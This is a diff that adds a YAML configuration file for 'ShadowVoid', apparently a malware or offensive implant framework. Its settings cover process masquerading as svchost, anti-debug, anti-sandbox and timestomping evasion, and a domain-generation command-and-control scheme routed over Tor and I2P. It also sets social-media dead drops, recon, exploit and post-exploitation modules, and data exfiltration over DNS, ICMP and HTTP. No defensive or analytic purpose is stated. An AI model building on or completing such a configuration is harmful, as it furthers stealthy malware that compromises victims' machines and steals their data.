@@ -1,0 +1,84 @@
+framework:
+  name: ShadowVoid
+  version: 1.0.0-alpha
+  author: ShadowVoid
+  memory_resident: true
+  polymorphic: true
+  debug: false
+
+stealth:
+  process_name: svchost
+  hide_from_ps: true
+  scrub_history: true
+  clear_screen: true
+  anti_debug: true
+  anti_sandbox: true
+  timestomping: true
+
+c2:
+  enabled: true
+  dga:
+    enabled: true
+    domains_per_day: 1000
+    tlds:
+      - com
+      - net
+      - org
+      - io
+      - xyz
+  routing:
+    tor: true
+    i2p: true
+    socks5: 127.0.0.1:9050
+  dead_drops:
+    twitter: true
+    pastebin: true
+    github: true
+    discord: true
+  heartbeat:
+    interval: 300
+    jitter: 60
+    kill_switch: 7200
+
+modules:
+  recon:
+    enabled: true
+    path: modules/recon.py
+  exploit:
+    enabled: true
+    path: modules/exploit.py
+  auth:
+    enabled: true
+    path: modules/auth.py
+  wireless:
+    enabled: true
+    path: modules/wireless.py
+  net:
+    enabled: true
+    path: modules/net.py
+  web:
+    enabled: true
+    path: modules/web.py
+  onion:
+    enabled: true
+    path: modules/onion.py
+  post_exploit:
+    enabled: true
+    path: modules/post_exploit.py
+
+exfiltration:
+  compression: zstd
+  encryption: true
+  channels:
+    dns: true
+    icmp: true
+    http: true
+    https: true
+  max_chunk_size: 1024
+
+logging:
+  enabled: true
+  encrypted: true
+  location: /tmp/.sv_logs
+  rotation: 24
+  purge_after: 72
